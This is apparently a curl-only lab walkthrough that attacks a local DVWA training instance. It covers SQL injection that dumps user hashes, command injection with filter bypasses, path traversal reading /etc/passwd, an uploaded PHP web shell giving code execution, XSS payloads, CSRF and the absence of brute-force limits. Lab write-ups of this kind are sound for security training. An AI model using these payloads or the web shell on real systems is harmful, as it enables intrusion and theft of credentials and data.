# Attacking a stock DVWA (curl-only walkthrough)

Verified against DVWA on Apache/2.4.68 + PHP 8, security level low then medium.
Every command below was run; outputs are the real ones.

## 0. Session bootstrap (the two things that waste the first ten minutes)

DVWA login is CSRF-protected and the security level lives in a cookie, not in the URL.

```bash
# 1) get a session + the login token
TOK=$(curl -s -c cookies.txt http://localhost/DVWA/login.php \
      | grep -oE "name='user_token' value='[a-f0-9]+'" | sed "s/.*value='//;s/'//")
curl -s -b cookies.txt -c cookies.txt -o /dev/null -w "%{http_code} %{redirect_url}\n" \
     -d "username=admin&password=[REDACTED_SECRET]" \
     http://localhost/DVWA/login.php            # → 302 /DVWA/index.php

# 2) set the level (also CSRF-protected: fetch /security.php again for a fresh token)
TOK=$(curl -s -b cookies.txt http://localhost/DVWA/security.php \
      | grep -oE "name='user_token' value='[a-f0-9]+'" | sed "s/.*value='//;s/'//")
curl -s -b cookies.txt -c cookies.txt -o /dev/null \
     -d "security=low&seclev_submit=Submit&user_token=$TOK" http://localhost/DVWA/security.php
```

Pitfalls: the token is single-use per page load; re-fetch it before every POST that needs it.
Confirm the level from a module page (`Security Level:</em> low`), not from the cookie alone.

## 1. SQL injection (low)

```bash
curl -s -b cookies.txt --get --data-urlencode "id=1' OR '1'='1" \
     --data-urlencode "Submit=Submit" http://localhost/DVWA/vulnerabilities/sqli/
curl -s -b cookies.txt --get --data-urlencode "id=1' UNION SELECT user(),database()-- -" \
     --data-urlencode "Submit=Submit" http://localhost/DVWA/vulnerabilities/sqli/
curl -s -b cookies.txt --get --data-urlencode "id=1' UNION SELECT user,password FROM users-- -" \
     --data-urlencode "Submit=Submit" http://localhost/DVWA/vulnerabilities/sqli/
```
Results render between `<pre>` tags as `First name: … Surname: …` — grep for that, not for `<pre>`
(the payload is echoed in the first `<pre>` too, which looks like "no data" if you only eyeball it).
Low-level returns 5 users with MD5 hashes; `admin` = `5f4dcc3b5aa765d61d8327deb882cf99`.

## 2. Command injection

```bash
# low: ";" works
curl -s -b cookies.txt --data-urlencode "ip=127.0.0.1;id" --data-urlencode "Submit=Submit" \
     http://localhost/DVWA/vulnerabilities/exec/
```
Bypass table (measured):

| Level | Blocked | Works |
|---|---|---|
| low | — | `;` `|` `&&` `$()` |
| medium | `&&`, `;` | **`|`** → `uid=33(www-data) gid=33(www-data)` |

## 3. LFI — count the depth from the *include* directory, not the URL

`/vulnerabilities/fi/index.php` lives in `.../vulnerabilities/fi/`, so 4 `../` lands in
`/var/www/html` and fails; 6 reaches `/`:

```bash
for n in 3 4 5 6; do d=$(printf '../%.0s' $(seq 1 $n));
  curl -s -b cookies.txt --get --data-urlencode "page=${d}etc/passwd" \
       http://localhost/DVWA/vulnerabilities/fi/ | grep -oE "^root:x:[0-9]+"; done
```
`../../../../../../etc/passwd` → `root:x:0:0:root:/root:/bin/bash`.
Keep the failed shallower attempt as evidence: it shows you measured rather than guessed.

## 4. Upload → RCE

```bash
printf '%s' '<?php echo "PWNED:"; echo shell_exec($_GET["c"]); ?>' > shell.php
curl -s -b cookies.txt -F "uploaded=@shell.php;type=application/x-php" -F "Upload=Upload" \
     http://localhost/DVWA/vulnerabilities/upload/      # → "succesfully uploaded"
curl -s "http://localhost/DVWA/hackable/uploads/shell.php?c=id"
# → PWNED:uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 5. The three XSS contexts

```bash
# reflected — response is literally  <pre>Hello <svg/onload=alert(document.domain)></pre>
curl -s -b cookies.txt --get --data-urlencode "name=<svg/onload=alert(document.domain)>" \
     http://localhost/DVWA/vulnerabilities/xss_r/

# stored (guestbook) — POST then re-GET the page and grep for the payload
curl -s -b cookies.txt --data-urlencode "txtName=<svg/onload=alert(1)>" \
     --data-urlencode "mtxMessage=stored-xss-proof-1" --data-urlencode "btnSign=Sign Guestbook" \
     http://localhost/DVWA/vulnerabilities/xss_s/
```

DOM XSS (`?default=`) — server never sees the sink; read it in the page source:

```js
var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
```
Payload `?default=English%27%3E%3Csvg/onload=alert(1)%3E` breaks the attribute **and** the
`decodeURI` copy is a second sink on the same parameter.

Medium-level bypass table (measured): `<script>alert(1)</script>` → stripped to `alert(1)</script>`;
`<svg/onload=alert(1)>` → passes untouched. That is the whole point of event-handler vectors.

## 6. CSRF + no brute-force protection

```bash
# state change with zero token (DVWA low) — set it back to the original value afterwards
curl -s -b cookies.txt --get --data-urlencode "password_new=password" \
     --data-urlencode "password_conf=password" --data-urlencode "Change=Change" \
     http://localhost/DVWA/vulnerabilities/csrf/          # → "Password Changed"

# 6 wrong passwords, all 200, no delay/lockout; the 7th returns
# "Welcome to the password protected area admin"
```

## Discipline

- Restore the lab: set the security level back to what you found, and re-set passwords you changed.
- One request per hypothesis on the first pass; only brute the module that exists for it.
- Save the raw HTML of every hit (`evidence/*.html`) — a curl transcript beats a claim.
